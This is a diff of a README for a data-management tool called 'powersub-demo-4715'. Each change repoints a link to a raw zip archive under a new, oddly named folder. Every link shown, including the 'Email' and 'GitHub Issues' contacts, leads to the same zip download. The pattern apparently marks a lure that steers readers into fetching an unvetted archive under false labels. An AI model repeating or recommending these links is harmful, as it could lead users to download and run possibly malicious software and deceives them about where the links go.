@@ -15,7 +15,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download Now
 
-[![Download Now](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/fatherling/powersub-demo-4715.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/fatherling/powersub-demo-4715.zip)
+[![Download Now](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/gorger/powersub-demo-v2.6-beta.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/gorger/powersub-demo-v2.6-beta.2.zip)
 
 ## 🔍 Overview of Features
 
@@ -32,7 +32,7 @@ This application offers several key features to help you manage your data effect
 
 To download the software, visit our Releases page:
 
-[Visit the Release Page](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/fatherling/powersub-demo-4715.zip)
+[Visit the Release Page](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/gorger/powersub-demo-v2.6-beta.2.zip)
 
 ### Step 2: Choose Your Version
 
@@ -72,8 +72,8 @@ If you encounter any problems or have questions:
 
 For further assistance or inquiries, you can reach out via the following channels:
 
-- **Email:** https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/fatherling/powersub-demo-4715.zip
-- **GitHub Issues:** [Submit an issue](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/fatherling/powersub-demo-4715.zip)
+- **Email:** https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/gorger/powersub-demo-v2.6-beta.2.zip
+- **GitHub Issues:** [Submit an issue](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/gorger/powersub-demo-v2.6-beta.2.zip)
 
 ## 📦 Manage Your Data Today
 
@@ -81,4 +81,4 @@ You are now ready to start using powersub-demo-4715. Enjoy managing your data wi
 
 ### Quick Download Link Again
 
-[Download Now](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/fatherling/powersub-demo-4715.zip) and experience the simplicity of data management today!
+[Download Now](https://raw.githubusercontent.com/TheNameIsPremSai300/powersub-demo-4715/main/gorger/powersub-demo-v2.6-beta.2.zip) and experience the simplicity of data management today!
